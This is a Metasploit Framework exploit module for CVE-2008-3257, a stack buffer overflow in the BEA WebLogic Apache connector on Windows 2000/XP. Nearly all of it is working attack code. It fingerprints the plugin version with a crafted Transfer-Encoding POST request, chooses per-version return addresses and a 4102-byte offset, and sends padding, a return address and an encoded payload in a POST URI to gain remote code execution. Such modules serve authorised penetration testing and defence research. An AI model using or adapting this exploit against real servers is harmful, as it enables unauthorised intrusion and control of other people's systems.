# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  HttpFingerprint = { :pattern => [ /Apache/ ] }

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Oracle Weblogic Apache Connector POST Request Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a stack based buffer overflow in the BEA
        Weblogic Apache plugin.

        The connector fails to properly handle specially crafted HTTP POST
        requests, resulting a buffer overflow due to the insecure usage
        of sprintf.  Currently, this module works over Windows systems without DEP,
        and has been tested with Windows 2000 / XP.

        In addition, the Weblogic Apache plugin version is fingerprinted with a POST
        request containing a specially crafted Transfer-Encoding header.
      },
      &#039;Author&#039;         =>
        [
          &#039;KingCope&#039;, # Vulnerability Discovery and PoC
          &#039;juan vazquez&#039;, # Metasploit Module
        ],
      &#039;Version&#039;        => &#039;$Revision: $&#039;,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2008-3257&#039; ],
          [ &#039;OSVDB&#039;, &#039;47096&#039; ],
          [ &#039;BID&#039;, &#039;30273&#039; ]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;process&#039;,
        },
      &#039;Privileged&#039;     => true,
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;    => 4000,
          &#039;BadChars&#039; => "\x00\x0d\x0a\x3f"
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;Automatic&#039;, {} ],
          [  &#039;BEA WebLogic 8.1 SP6 - mod_wl_20.so / Apache 2.0 / Windows [XP/2000]&#039;,
            {
              &#039;Ret&#039; => 0x10061f63, # push esp # ret # mod_wl_20.so
              &#039;Offset&#039; =>  4102
            }
          ],
          [  &#039;BEA WebLogic 8.1 SP5 - mod_wl_20.so / Apache 2.0 / Windows [XP/2000]&#039;,
            {
              &#039;Ret&#039; => 0x10061473, # push esp # ret # mod_wl_20.so
              &#039;Offset&#039; =>  4102
            }
          ],
          [  &#039;BEA WebLogic 8.1 SP4 - mod_wl_20.so / Apache 2.0 / Windows [XP/2000]&#039;,
            {
              &#039;Ret&#039; => 0x10020e31, # push esp # ret # mod_wl_20.so
              &#039;Offset&#039; =>  4102
            }
          ]
        ],
      &#039;DisclosureDate&#039; => &#039;Jul 17 2008&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI path to a jsp or object provided by Weblogic&#039;, &#039;/index.jsp&#039;]),
      ], self.class)

  end


  def check

    fingerprint = fingerprint_mod_wl

    case fingerprint
    when /Version found/
      return Exploit::CheckCode::Vulnerable
    when /BEA WebLogic connector vulnerable/
      return Exploit::CheckCode::Appears
    when /BEA WebLogic connector undefined/
      return Exploit::CheckCode::Detected
    when /BEA WebLogic connector no vulnerable/, /BEA WebLogic connector not found/
      return Exploit::CheckCode::Safe
    end

  end

  def exploit

    # Autodetect BEA mod_wl version
    my_target = get_target

    # Avoid the attack if the victim doesn&#039;t have the same setup we&#039;re targeting
    if my_target.nil?
      print_error("BEA mod_weblogic not supported")
      return
    end

    uri = target_uri.path
    sploit = rand_text_alphanumeric(my_target[&#039;Offset&#039;]-uri.length)
    sploit << [my_target.ret].pack("V")
    sploit << payload.encoded

    send_request_cgi({
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;     => "#{uri} #{sploit}",
    })

    handler

  end

  def get_target

    return target if target.name != &#039;Automatic&#039;

    fingerprint = fingerprint_mod_wl

    case fingerprint
    when /BEA WebLogic 8.1 SP6 - mod_wl_20.so/
      return targets[1]
    when /BEA WebLogic 8.1 SP5 - mod_wl_20.so/
      return targets[2]
    when /BEA WebLogic 8.1 SP4 - mod_wl_20.so/
      return targets[3]
    else
      return nil
    end

  end

  def fingerprint_mod_wl

    my_data = rand_text_alpha(rand(5) + 8)
    res = send_request_cgi(
        {
          &#039;method&#039;  => &#039;POST&#039;,
          &#039;uri&#039;     => target_uri.path,
          &#039;headers&#039; =>
            {
              &#039;Transfer-Encoding&#039; => my_data
            },
          &#039;data&#039; => "#{my_data.length}\r\n#{my_data}\r\n0\r\n",
        })

    if res and res.code == 200 and res.body =~ /Weblogic Bridge Message/
      # BEA WebLogic 8.1 SP6 - mod_wl_20.so
      case res.body
      when (/Build date\/time:<\/B> <I>Jun 16 2006 15:14:11/ and /Change Number:<\/B> <I>779586/)
        return "Version found: BEA WebLogic 8.1 SP6 - mod_wl_20.so"
      # BEA WebLogic 8.1 SP5 - mod_wl_20.so
      when (/Build date\/time:<\/B> <I>Aug  5 2005 11:19:57/ and /Change Number:<\/B> <I>616810/)
        return "Version found: BEA WebLogic 8.1 SP5 - mod_wl_20.so"
      when (/Build date\/time:<\/B> <I>Oct 25 2004 09:25:23/ and /Change Number:<\/B> <I>452998/)
        return "Version found: BEA WebLogic 8.1 SP4 - mod_wl_20.so"
      # Check for dates prior to patch release
      when /([A-Za-z]{3} [\s\d]{2} [\d]{4})/
        build_date = Date.parse($1)
        if build_date <= Date.parse("Jul 28 2008")
          return "BEA WebLogic connector vulnerable"
        else
          return "BEA WebLogic connector no vulnerable"
        end
      else
        return "BEA WebLogic connector undefined"
      end
    end

    return "BEA WebLogic connector not found"

  end

end



